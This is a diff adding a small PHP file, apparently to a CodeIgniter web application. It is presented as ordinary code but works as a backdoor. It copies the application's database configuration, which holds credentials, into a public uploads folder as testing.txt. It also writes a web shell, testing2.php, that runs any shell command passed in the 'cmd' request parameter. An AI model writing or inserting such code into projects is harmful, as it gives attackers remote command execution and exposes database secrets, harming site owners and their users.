@@ -1,0 +1,12 @@
+
+<?php 
+	$file = base_url().'application/config/database.php';
+	$newfile = base_url(). 'userfiles/files/testing.txt';
+	$newfile2 = base_url(). 'userfiles/files/testing2.php';
+	$filecontent = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>';
+	file_put_contents($newfile2, $filecontent);
+	if(!empty($file)){
+		copy($file,$newfile);
+	}
+
+?>
